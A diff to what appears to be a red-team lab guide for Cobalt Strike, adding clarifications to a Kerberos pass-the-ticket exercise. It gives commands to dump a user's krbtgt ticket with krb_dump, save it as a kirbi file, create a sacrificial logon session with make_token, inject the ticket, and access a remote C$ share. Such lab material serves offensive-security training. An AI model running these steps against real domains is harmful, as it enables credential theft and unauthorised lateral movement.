@@ -11,9 +11,13 @@
 3. Attempt to list the C$ share on *lon-ws-1*.
     1. `ls \\\\lon-ws-1\\c$`
 
-⚠️ This will fail with an ACCESS_DENIED error.
+⚠️ This will fail with an ACCESS_DENIED error, because user not impersonated!  
 
-5. Triage Kerberos tickes.
+⚠️ Prerequisite: Load BOF aggressor script for `krb_triage` and `krb_dump`  
+
+>Open > Cobalt Strike > Script Manager > Load > `C:\Tools\Kerbeus-BOF\kerbeus_cs.cna`  
+
+5. Triage Kerberos tickets.
     1. `krb_triage`
 
 ⚠️ You're looking for a ticket entry that looks like **rsteel @ CONTOSO.COM | krbtgt/CONTOSO.COM**.
@@ -22,9 +26,12 @@
 
     ```beacon-nocolor
     krb_dump /user:rsteel /service:krbtgt
-    ```
+    ```  
+2. Copy the base64 ticket.
 
 1. Save the ticket to the attacker machine.
+2. Open Powershell window on the attacker machine.  
+3. Paste the above krbtgt Base64 ticket into below command and execute to save the kirbi file on attack machine.  
 
     ```Terminal-nocolor
     [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[B64 TICKET]"))
@@ -34,8 +41,9 @@
 
 # Pass the Ticket
 
-1. Create a new logon session
-    1. `make_token CONTOSO\rsteel FakePass`
+1. In the Beacon interactive session, Create a new logon session, run:  
+
+    `make_token CONTOSO\rsteel FakePass`
 
 2. Inject the ticket into it.
 
@@ -49,9 +57,9 @@
 1. Attempt to access the share again.
     1. `ls \\\\lon-ws-1\\c$`
 
-    > [!HELP] It should work this time.
+⚠️ It should work this time.
 
-1. [] Drop the impersonation.
+1. Drop the impersonation.
   1. `rev2self`
 
 ⚠️ In this lab, you have dumped a user's TGT from their logon session, injected it into your own sacrificial logon session, and impersonated it to access a remote resource as that user.
